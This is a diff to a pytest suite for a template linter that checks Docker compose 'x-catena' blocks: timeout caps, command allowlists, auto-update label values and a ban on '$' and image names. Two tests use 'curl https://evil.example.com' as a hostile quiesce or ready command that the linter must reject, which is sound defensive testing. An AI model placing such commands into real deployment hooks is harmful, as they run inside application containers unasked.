@@ -11,6 +11,7 @@ import sys
 from pathlib import Path
 
 import pytest
+import yaml
 
 ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT))
@@ -87,8 +88,8 @@ def test_the_families_do_not_share_an_allowlist():
 
 
 def test_lifecycle_timeout_cap_lives_in_the_schema():
-    schema = json.loads((ROOT / "sources.schema.json").read_text())
-    lifecycle = schema["properties"]["x-catena"]["properties"]["lifecycle"]
+    schema = json.loads((ROOT / "block.schema.json").read_text())
+    lifecycle = schema["properties"]["lifecycle"]
     assert lifecycle["properties"]["timeout_seconds"]["maximum"] == 3600
     assert lifecycle["required"] == ["service", "timeout_seconds"]
     assert lifecycle["anyOf"] == [{"required": ["migrate"]},
@@ -96,10 +97,10 @@ def test_lifecycle_timeout_cap_lives_in_the_schema():
 
 
 def test_quiesce_timeout_cap_lives_in_the_schema():
-    """The cap lives in sources.schema.json and nowhere else, so it is
+    """The cap lives in block.schema.json and nowhere else, so it is
     enforced on every load rather than only by the lint entrypoint."""
-    schema = json.loads((ROOT / "sources.schema.json").read_text())
-    quiesce = schema["properties"]["x-catena"]["properties"]["quiesce"]
+    schema = json.loads((ROOT / "block.schema.json").read_text())
+    quiesce = schema["properties"]["quiesce"]
     assert quiesce["properties"]["timeout_seconds"]["maximum"] == 60
     assert quiesce["required"] == ["service", "pre", "timeout_seconds"]
 
@@ -111,7 +112,8 @@ def test_lint_all_against_real_sources_passes():
 def test_lint_all_rejects_a_hostile_quiesce_command(monkeypatch, tmp_path, capsys):
     """A synthetic sources/ tree with a hostile command must fail. Proves
     the gate is reading sources, not a cached artifact."""
-    _synthetic_sources(monkeypatch, tmp_path, {
+    _synthetic_sources(monkeypatch, tmp_path, {}, block={
+        "schema": 1,
         "quiesce": {
             "service": "app",
             "pre": [["curl", "https://evil.example.com"]],
@@ -129,7 +131,8 @@ def test_lint_all_rejects_a_service_the_compose_does_not_define(
     """The host finds the container by the service name. A name the
     compose does not define fails the quiesce on every host, and the
     backup runs without it."""
-    _synthetic_sources(monkeypatch, tmp_path, {
+    _synthetic_sources(monkeypatch, tmp_path, {}, block={
+        "schema": 1,
         "quiesce": {
             "service": "db",
             "pre": [["mongosh", "--quiet", "--eval", "db.fsyncLock()"]],
@@ -144,7 +147,8 @@ def test_lint_all_rejects_a_service_the_compose_does_not_define(
 def test_lint_all_rejects_a_foreign_ready_command(monkeypatch, tmp_path, capsys):
     """The ready question runs inside the application container before
     every update phase, so it gets the lifecycle allowlist too."""
-    _synthetic_sources(monkeypatch, tmp_path, {
+    _synthetic_sources(monkeypatch, tmp_path, {}, block={
+        "schema": 1,
         "lifecycle": {
             "service": "app",
             "ready": ["curl", "https://evil.example.com"],
@@ -179,7 +183,7 @@ volumes:
 
 
 def _versioned(volumes: list[str]) -> dict:
-    return {"lifecycle": {
+    return {"schema": 1, "lifecycle": {
         "service": "app",
         "migrate": [["php", "occ", "db:add-missing-indices"]],
         "versioned_volumes": volumes,
@@ -191,7 +195,8 @@ def test_a_versioned_volume_long_running_services_mount_passes(
         monkeypatch, tmp_path, capsys):
     """Both compose forms count as a mount: the short `name:/path` and the
     long `source:`."""
-    _synthetic_sources(monkeypatch, tmp_path, _versioned(["code"]), _VERSIONED_COMPOSE)
+    _synthetic_sources(monkeypatch, tmp_path, {}, _VERSIONED_COMPOSE,
+                       block=_versioned(["code"]))
     assert L.lint_all() == 0, capsys.readouterr().out
 
 
@@ -209,7 +214,7 @@ def test_a_versioned_volume_a_rollback_cannot_put_back_is_refused(
     compose = _VERSIONED_COMPOSE + "  spare:\n"
     compose = compose.replace("    volumes: [\"code:/var/www/html\", ",
                               "    volumes: [\"cache:/tmp/cache\", \"code:/var/www/html\", ")
-    _synthetic_sources(monkeypatch, tmp_path, _versioned([volume]), compose)
+    _synthetic_sources(monkeypatch, tmp_path, {}, compose, block=_versioned([volume]))
     assert L.lint_all() == 1
     out = capsys.readouterr().out
     assert f"synthetic-bad.lifecycle.versioned_volumes: {volume!r} {needle}" in out
@@ -234,18 +239,70 @@ def test_a_template_that_asks_for_a_sign_in_entry_passes(monkeypatch, tmp_path, 
     assert L.lint_all() == 0, capsys.readouterr().out
 
 
+@pytest.mark.parametrize("managed", [False, True])
 @pytest.mark.parametrize("key", ["OIDC_CLIENT_ID", "OIDC_CLIENT_SECRET", "OIDC_ISSUER_URL"])
 def test_a_sign_in_value_the_sync_writes_has_no_second_writer(
-        monkeypatch, tmp_path, capsys, key):
+        monkeypatch, tmp_path, capsys, key, managed):
     """The settings sync writes the three values from the app's own
     Keycloak client; a catalog default or a managed key would write the
     same key from somewhere else."""
+    line = f"{key}=" if managed else f"{key}=from-the-catalog"
+    block = {"schema": 1, "managed_env": {key: "x"}} if managed else None
     _synthetic_sources(monkeypatch, tmp_path, {
-        "env_defaults": ["DOMAIN_HOST=x.example.com", f"{key}=from-the-catalog"],
-        "env_managed_keys": [key],
-    }, _SIGNIN_COMPOSE)
+        "env_defaults": ["DOMAIN_HOST=x.example.com", line],
+    }, _SIGNIN_COMPOSE, block=block)
     assert L.lint_all() == 1
     assert f"synthetic-bad: {key} is declared in env_defaults" in capsys.readouterr().out
+
+
+def _auto_update(value: str) -> str:
+    return ("services:\n  app:\n    image: acme/app:1.0.0\n    labels:\n"
+            f'      - "vps.auto-update={value}"\n')
+
+
+@pytest.mark.parametrize("value", ["off", "patch", "minor", "patch+minor", "major", "Minor"])
+def test_an_auto_update_policy_the_engine_knows_passes(monkeypatch, tmp_path, capsys, value):
+    _synthetic_sources(monkeypatch, tmp_path, {}, _auto_update(value))
+    assert L.lint_all() == 0, capsys.readouterr().out
+
+
+@pytest.mark.parametrize("value", ["minorr", "patch,minor", "true", "never"])
+def test_an_unknown_auto_update_policy_is_refused(monkeypatch, tmp_path, capsys, value):
+    """The engine replaces a value it does not know with its default, so a
+    typo would pass as a policy nobody chose."""
+    _synthetic_sources(monkeypatch, tmp_path, {}, _auto_update(value))
+    assert L.lint_all() == 1
+    assert (f"synthetic-bad:app: vps.auto-update={value} is not one of "
+            "major, minor, off, patch, patch+minor") in capsys.readouterr().out
+
+
+def test_a_block_with_no_dollar_and_no_image_passes(monkeypatch, tmp_path, capsys):
+    _synthetic_sources(monkeypatch, tmp_path, {"env_defaults": ["DOMAIN_HOST="]}, block={
+        "schema": 1, "managed_env": {"DOMAIN_HOST": "x.{{ cloudflare_zone }}"}})
+    assert L.lint_all() == 0, capsys.readouterr().out
+
+
+@pytest.mark.parametrize("block,needle", [
+    ({"managed_env": {"DOMAIN_HOST": "x.${ZONE}"}},
+     "synthetic-bad.x-catena.managed_env.DOMAIN_HOST: holds a $"),
+    ({"quiesce": {"service": "app", "pre": [["pkill", "-x", "$$PID"]], "timeout_seconds": 10}},
+     "synthetic-bad.x-catena.quiesce.pre[0][2]: holds a $"),
+    ({"managed_env": {"DOMAIN_HOST": "acme/app:1.0.0"}},
+     "synthetic-bad.x-catena.managed_env.DOMAIN_HOST: names the image acme/app:1.0.0"),
+    ({"lifecycle": {"service": "app", "ready": ["acme/app:1.0.0", "run"],
+                    "migrate": [["php", "occ", "status"]], "timeout_seconds": 60}},
+     "synthetic-bad.x-catena.lifecycle.ready[0]: names the image acme/app:1.0.0"),
+])
+def test_a_block_with_a_dollar_or_an_image_is_refused(
+        monkeypatch, tmp_path, capsys, block, needle):
+    """Docker interpolates every value under a top-level x- key when it
+    deploys the file, and the update lane rewrites each image reference it
+    finds in the file."""
+    _synthetic_sources(monkeypatch, tmp_path, {"env_defaults": ["DOMAIN_HOST="]},
+                       "services:\n  app:\n    image: acme/app:1.0.0\n",
+                       block={"schema": 1, **block})
+    assert L.lint_all() == 1
+    assert needle in capsys.readouterr().out
 
 
 @pytest.mark.parametrize("edit,needle", [
@@ -360,15 +417,18 @@ def test_the_database_match_reads_the_image_name_only():
 
 
 def _synthetic_sources(monkeypatch, tmp_path, catena: dict,
-                       compose: str = "services:\n  app:\n    image: x\n") -> None:
+                       compose: str = "services:\n  app:\n    image: x\n",
+                       block: dict | None = None) -> None:
     """Point the loader at a one-template sources/ tree whose compose is
-    `compose` (one service, `app`, by default) and whose x-catena block
-    carries `catena` over the required fields."""
+    `compose` (one service, `app`, by default) behind `block` as its x-catena
+    block, and whose source x-catena block carries `catena` over the required
+    fields."""
     sources = tmp_path / "sources"
     sources.mkdir()
     blueprint = tmp_path / "blueprints" / "synthetic-bad"
     blueprint.mkdir(parents=True)
-    (blueprint / model.COMPOSE_NAME).write_text(compose)
+    head = yaml.safe_dump({model.BLOCK_KEY: block}) + "\n" if block else ""
+    (blueprint / model.COMPOSE_NAME).write_text(head + compose)
     doc = {
         "id": "synthetic-bad",
         "type": 2,
